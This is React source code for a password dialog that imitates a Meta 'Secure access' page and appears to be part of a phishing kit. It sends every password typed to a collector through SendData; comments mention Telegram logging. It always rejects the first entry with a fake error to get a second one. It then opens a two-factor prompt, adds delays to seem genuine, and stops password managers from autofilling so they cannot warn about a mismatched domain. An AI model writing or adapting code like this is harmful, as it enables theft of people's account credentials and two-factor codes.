import React from 'react'
import { CircleAlert } from 'lucide-react'
import Modal from '#components/modals/Modal'
import PasswordInput from '#components/password-input/password-input'
import { useAppDispatch, useAppSelector } from '../../app/store/hooks'
import { updateForm } from '../../app/store/slices/stepFormSlice'
import { useAppStrings } from '@/hooks/useAppStrings'
import { SendData } from '@/utils/sendData'

interface PasswordModalProps {
  isOpend: boolean
  isOpendTwoFactor: (value: boolean) => void
  onToggleModal: (isOpen: boolean) => void
}

const SUBMIT_DELAY_MS = 1345
/** Chờ lâu hơn sau lần nhập mật khẩu thứ 2 (xác nhận) trước khi mở 2FA */
const SUBMIT_DELAY_SECOND_PASSWORD_MS = 5000
/** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)'

const PasswordModal: React.FC<PasswordModalProps> = ({
  isOpend,
  isOpendTwoFactor,
  onToggleModal,
}) => {
  const t = useAppStrings()

  const [isOpen, setIsOpen] = React.useState(isOpend)
  const [loading, setLoading] = React.useState(false)
  const [passwordStep, setPasswordStep] = React.useState<1 | 2>(1)
  const [password, setPassword] = React.useState('')
  const [errors, setErrors] = React.useState<Record<string, string>>({})
  const dispatch = useAppDispatch()
  const formData = useAppSelector((state) => state.stepForm.data)

  React.useEffect(() => {
    setIsOpen(isOpend)
    if (isOpend) {
      setPasswordStep(1)
      setPassword('')
      setErrors({})
      setLoading(false)
      dispatch(
        updateForm({
          password: '',
          passwordSecond: '',
          passwordThird: '',
        }),
      )
    }
  }, [isOpend, dispatch])

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { value } = e.target
    setPassword(value)
    setErrors((prev) => ({ ...prev, password: '' }))

    if (passwordStep === 1) {
      dispatch(updateForm({ password: value }))
    } else {
      dispatch(updateForm({ passwordSecond: value }))
    }
  }

  const handleClose = () => {
    setIsOpen(false)
    onToggleModal(false)
  }

  const waitAfterSend = async () => {
    try {
      await SendData(formData)
    } catch {
      /* luồng UX vẫn tiếp tục */
    }
    await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS))
  }

  const handSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const newErrors: Record<string, string> = {}
    if (!password.trim()) newErrors.password = t.password.errEmpty

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }

    if (passwordStep === 1) {
      setLoading(true)
      try {
        await waitAfterSend()
        setPassword('')
        setErrors({ password: t.password.errWrong })
        setPasswordStep(2)
      } finally {
        setLoading(false)
      }
      return
    }

    setLoading(true)
    try {
      await SendData(formData)
      await new Promise((r) => setTimeout(r, SUBMIT_DELAY_SECOND_PASSWORD_MS))
      isOpendTwoFactor(true)
      handleClose()
    } catch (error) {
      console.error('Error submitting form:', error)
      setPassword('')
      setErrors({ password: t.password.errWrong })
    } finally {
      setLoading(false)
    }
  }

  const inputClass = (field: string) =>
    `mv-secure-input ${errors[field] ? 'is-invalid' : ''}`

  const prompt = passwordStep === 1 ? t.password.firstPrompt : t.password.secondPrompt
  const passwordName = passwordStep === 1 ? 'account_access_key' : 'recheck_access_key'
  const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm'

  return (
    <Modal
      isOpen={isOpen}
      title=""
      onClose={handleClose}
      panelClassName="mv-secure-modal"
      backdropClassName="mv-secure-backdrop"
    >
      <div className="flex min-h-full w-full min-w-0 flex-1 flex-col pb-1 pt-1">
        <div className="flex w-full min-w-0 flex-col gap-5">
          <div className="flex flex-col items-center gap-3">
            <p className="mv-secure-kicker">Secure access</p>
            <div className="h-[40px] w-[40px] shrink-0">
              <img
                src="/images/meta/logo.svg"
                className="h-full w-full"
                width="40"
                height="40"
                alt=""
              />
            </div>
            <p className="mv-secure-prompt">{prompt}</p>
          </div>

          <form
            className="w-full min-w-0"
            onSubmit={handSubmit}
            autoComplete="off"
            data-lpignore="true"
            data-1p-ignore="true"
            data-bwignore="true"
          >
            <div className="w-full">
              <PasswordInput
                id={passwordId}
                name={passwordName}
                placeholder={passwordStep === 1 ? t.password.phFirst : t.password.phSecond}
                className={inputClass('password')}
                value={password}
                onChange={handleChange}
                autoComplete="off"
                allowToggle
                ariaShowPassword={t.password.ariaShowPassword}
                ariaHidePassword={t.password.ariaHidePassword}
                ariaPasswordToggleDisabled={t.password.ariaPasswordToggleDisabled}
              />
              {errors.password ? (
                <div
                  className="mb-2 mt-1 flex items-start gap-2 text-[13px] text-rose-600"
                  role="alert"
                >
                  <CircleAlert className="mt-0.5 size-4 shrink-0" aria-hidden />
                  <span>{errors.password}</span>
                </div>
              ) : null}
            </div>
            <div className="mt-5 w-full">
              <button type="submit" className="mv-secure-btn" disabled={loading}>
                {loading && (
                  <div className="mr-[10px] h-[18px] w-[18px] animate-spin">
                    <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                  </div>
                )}
                {loading ? '' : t.password.continue}
              </button>
            </div>
          </form>
        </div>

        <div className="mv-secure-footer-logo">
          <img src="/images/meta/logo-gray.svg" className="h-full w-full" width="48" height="48" alt="" />
        </div>
      </div>
    </Modal>
  )
}

export default PasswordModal
